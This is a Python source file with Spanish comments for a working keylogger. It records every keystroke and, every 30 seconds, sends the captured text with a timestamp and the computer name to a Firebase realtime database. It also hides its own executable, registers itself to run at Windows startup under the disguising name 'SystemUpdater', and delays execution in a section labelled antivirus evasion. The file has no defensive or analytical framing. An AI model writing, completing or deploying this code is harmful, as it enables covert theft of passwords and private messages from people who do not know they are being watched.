import threading
import datetime
import os
import sys
import time
import random
import string
import json
import platform
import keyboard  # La nueva librería que vamos a usar
import subprocess

# --- DETECCIÓN DEL SISTEMA OPERATIVO ---
IS_WINDOWS = platform.system() == 'Windows'
IS_MACOS = platform.system() == 'Darwin'

# --- CONFIGURACIÓN DE FIREBASE ---
try:
    import firebase_admin
    from firebase_admin import credentials, db

    def resource_path(relative_path):
        """ Obtiene la ruta absoluta al recurso, funciona para desarrollo y para PyInstaller """
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)

    cred_path = resource_path("gold.json")
    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://gold-51f84-default-rtdb.europe-west1.firebasedatabase.app/'
    })
    FIREBASE_ENABLED = True
    print("Firebase inicializado correctamente.")
except Exception as e:
    print(f"Error al inicializar Firebase: {e}")
    FIREBASE_ENABLED = False

# --- CLASES MODIFICADAS PARA FIREBASE ---

class RealtimeDataSender:
    def __init__(self):
        if FIREBASE_ENABLED:
            self.ref = db.reference('/')
        else:
            self.ref = None

    def send_keylog_data(self, keystrokes):
        if not self.ref:
            return
        try:
            keylogs_ref = self.ref.child('keylogs')
            new_log_ref = keylogs_ref.push()
            new_log_ref.set({
                'keystrokes': keystrokes,
                'timestamp': datetime.datetime.now().isoformat(),
                'computer_name': os.environ.get('COMPUTERNAME', os.environ.get('HOSTNAME', 'Unknown'))
            })
        except Exception as e:
            print(f"Error al enviar keylog a Firebase: {e}")

# --- CLASES PRINCIPALES ---

class Keylogger:
    def __init__(self, realtime_sender):
        self.log = ""
        self.realtime_sender = realtime_sender

    def callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            try:
                # event.name es el nombre de la tecla (ej: 'a', 'space', 'enter')
                if event.name == 'space':
                    self.log += ' '
                elif event.name == 'enter':
                    self.log += '\n'
                elif len(event.name) > 1:
                    self.log += f' [{event.name}] '
                else:
                    self.log += event.name
            except Exception as e:
                print(f"Error en callback de keylogger: {e}")

    def send_data(self):
        if self.log:
            self.realtime_sender.send_keylog_data(self.log)
            self.log = ""
        # Envía datos cada 30 segundos
        timer = threading.Timer(30, self.send_data)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.hook(self.callback)
        print("Keylogger con 'keyboard' iniciado.")
        keyboard.wait() # Mantiene el script corriendo

class StealthAndPersistence:
    @staticmethod
    def hide_file():
        try:
            if IS_WINDOWS:
                os.system(f'attrib +h "{sys.executable}"')
            elif IS_MACOS:
                subprocess.run(['chflags', 'hidden', sys.executable], check=True)
        except Exception as e:
            print(f"Error al ocultar archivo: {e}")

    @staticmethod
    def add_to_startup():
        try:
            if IS_WINDOWS:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.SetValueEx(registry_key, "SystemUpdater", 0, winreg.REG_SZ, sys.executable)
        except Exception as e:
            print(f"Error al añadir al inicio: {e}")

class AntivirusEvasion:
    @staticmethod
    def delay_execution():
        time.sleep(random.randint(60, 180))

# --- PROGRAMA PRINCIPAL ---

class MainProgram:
    def __init__(self):
        self.realtime_sender = RealtimeDataSender()
        self.keylogger = Keylogger(self.realtime_sender)

    def initialize(self):
        StealthAndPersistence.hide_file()
        StealthAndPersistence.add_to_startup()
        AntivirusEvasion.delay_execution()
        return True

    def run(self):
        if not self.initialize():
            return
        self.keylogger.start()

if __name__ == "__main__":
    program = MainProgram()
    program.run()
